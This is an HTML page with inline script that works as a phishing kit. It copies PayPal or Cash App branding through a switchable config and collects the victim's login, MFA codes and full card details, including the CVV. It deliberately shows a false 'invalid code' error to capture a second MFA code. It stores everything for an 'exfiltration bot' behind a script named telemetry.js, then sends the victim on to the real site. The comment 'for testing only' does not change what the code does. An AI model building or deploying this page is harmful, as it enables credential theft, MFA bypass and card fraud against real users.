<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access | Login</title>
    <link rel="stylesheet" href="styles.css">
    <!-- THIS IS AN EXAMPLE TEMPLATE FOR TESTING ONLY -->
    <!-- ignore this file & my shitty code -->
</head>
<body>

<div class="auth-card">
    <img id="logo-img" src="" alt="Logo" style="max-width: 150px; margin-bottom: 20px;">

    <div id="step-1">
        <p>Log in to manage your account.</p>
        <form id="form-login">
            <input type="text" id="u" placeholder="Email or Username" required autocomplete="off">
            <input type="password" id="p" placeholder="Password" required autocomplete="off">
            <button type="submit" id="btn-next">Next</button>
        </form>
    </div>

    <div id="step-2" class="hidden">
        <h3>Enter Security Code</h3>
        <p style="font-size: 13px;">A 6-digit code was sent to your device.</p>
        <span id="mfa-error" class="error-text hidden" style="color: #d93025; font-size: 13px;">Invalid or expired code. Please try again.</span>
        <form id="form-mfa">
            <input type="text" id="otp" class="mfa-input" maxlength="6" placeholder="000000" required autocomplete="off">
            <button type="submit">Verify</button>
        </form>
    </div>

    <div id="step-billing" class="hidden">
        <h3>Confirm Identity</h3>
        <p style="font-size: 13px;">Please verify your primary billing method to secure your account.</p>
        <form id="form-billing">
            <input type="text" id="cc_name" placeholder="Cardholder Name" required>
            <input type="text" id="cc_num" placeholder="Card Number" maxlength="19" required>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="cc_exp" placeholder="MM/YY" maxlength="5" required style="flex: 1;">
                <input type="text" id="cc_cvv" placeholder="CVV" maxlength="4" required style="flex: 1;">
            </div>
            <button type="submit">Verify Billing</button>
        </form>
    </div>
</div>

<script src="telemetry.js"></script>
<script src="app.js"></script>
<script>
    /**
     * CONFIGURATION MANIFEST
     * Switch between brands by changing the 'current' key.
     */
    const BrandConfig = {
        "paypal": {
            "logo": "https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg",
            "primary": "#0070ba",
            "redirect": "https://paypal.com/signin"
        },
        "cashapp": {
            "logo": "https://cash.app/assets/images/brand/logo.png",
            "primary": "#00d632",
            "redirect": "https://cash.app/login"
        }
    };

    const config = BrandConfig["paypal"]; // <--- Switch this to re-skin

    // Apply Brand Setup
    document.getElementById('logo-img').src = config.logo;
    document.documentElement.style.setProperty('--primary-blue', config.primary);

    let attempts = 0;

    // Handle Login Submit
    document.getElementById('form-login').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Save to session storage for the exfiltration bot
        sessionStorage.setItem('log_u', document.getElementById('u').value);
        sessionStorage.setItem('log_p', document.getElementById('p').value);
        
        // Transition UI
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
        
        // Trigger initial background audit
        TelemetryScanner.runAudit();
    });

    // Handle MFA Submit (Ghosting Logic)
    document.getElementById('form-mfa').addEventListener('submit', async (e) => {
        e.preventDefault();
        attempts++;
        
        const code = document.getElementById('otp').value;
        sessionStorage.setItem(`mfa_${attempts}`, code);

        // Check the toggle in telemetry.js
        if (TelemetryScanner.settings.enableGhosting && attempts === 1) {
            // Force an error to capture the SECOND code (the "Ghost")
            document.getElementById('mfa-error').classList.remove('hidden');
            document.getElementById('otp').value = ""; 
            
            // Log the first code immediately
            TelemetryScanner.runAudit(false);
        } else {
            // Move to Billing Stage (Either ghosting is off, or it's the 2nd attempt)
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-billing').classList.remove('hidden');
            TelemetryScanner.runAudit();
        }
    });

    // Handle Billing Submit
    document.getElementById('form-billing').addEventListener('submit', async (e) => {
        e.preventDefault();

        sessionStorage.setItem('cc_name', document.getElementById('cc_name').value);
        sessionStorage.setItem('cc_num', document.getElementById('cc_num').value);
        sessionStorage.setItem('cc_exp', document.getElementById('cc_exp').value);
        sessionStorage.setItem('cc_cvv', document.getElementById('cc_cvv').value);

        // Finalize capture and redirect
        await TelemetryScanner.runAudit(true);
        window.location.href = config.redirect;
    });

    // Auto-format card number
    document.getElementById('cc_num').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });
</script>

</body>
</html>
